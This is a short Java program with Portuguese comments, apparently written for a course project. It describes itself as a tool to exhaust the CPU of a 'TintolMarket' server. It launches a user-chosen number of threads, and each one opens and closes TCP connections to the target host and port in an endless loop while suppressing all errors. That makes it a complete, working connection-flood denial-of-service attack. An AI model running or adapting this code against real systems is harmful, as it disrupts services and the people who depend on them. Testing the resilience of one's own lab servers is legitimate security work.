// Para consumir CPU do servidor TintolMarket:
// java NoTintol <ip do TintolMarketServer> <porto do TintolMarketServer> <n_threads>

import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSession;
import javax.net.SocketFactory;

import java.net.InetSocketAddress;
import java.net.Socket;

import java.util.HashSet;
import java.util.Set;

public class NoTintol {

    public static void main(String[] args){
        
        Set<Thread> threads = new HashSet<>();
        
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        int n_threads = Integer.parseInt(args[2]);

        for (int t=0; t<n_threads;t++){
            threads.add(new Thread(new SynRunnable(host,port)));
        }

        for(Thread thread:threads){
            thread.start();
        }

    }
    
}

class SynRunnable implements Runnable {

    private String host;
    private int port;

    public SynRunnable(String host, int port){
        this.host = host;
        this.port = port;
    }

    public void run(){

        while(true){
            try{
                Socket s = new Socket();

                s.connect(new InetSocketAddress(host, port),2500);
                Thread.sleep(100);
                s.close();

            }catch(Exception e){
                //e.printStackTrace();
            }
        }

    }

}
